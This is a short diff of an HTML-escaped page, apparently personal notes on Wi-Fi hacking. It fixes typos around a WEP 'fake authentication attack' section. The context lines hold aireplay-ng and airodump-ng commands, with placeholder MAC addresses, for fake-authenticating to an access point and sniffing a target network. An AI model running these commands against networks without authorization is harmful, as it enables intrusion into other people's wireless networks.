@@ -363,14 +363,14 @@ and if its in 2.4Ghz then remove the &amp;ldquo;-D&amp;rdquo;&lt;/em&gt;}&lt;/p&
 &lt;p&gt;&lt;em&gt;if client still has access to other networks then split the terminal and run same attack parallel on that network&lt;/em&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h1 id=&#34;fake-authentication-attack-wep&#34;&gt;Fake authentication attack (wep)&lt;/h1&gt;
-&lt;p&gt;&lt;em&gt;forcing AP to generate new packets with new IVs&lt;/em&gt;``&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;forcing AP to generate new packets with new IVs&lt;/em&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;code&gt;aireplay-ng --fakeauth 0 -a [network Mac add] -h[our Mac add] wlan0&lt;/code&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;code&gt;airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel x --write xxxx wlan0&lt;/code&gt;
-(&lt;em&gt;sniffing target network with storing data and runnig parallely&lt;/em&gt;)&lt;/p&gt;
+(&lt;em&gt;sniffing target network with storing data and running parallely&lt;/em&gt;)&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;code&gt;aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0&lt;/code&gt;
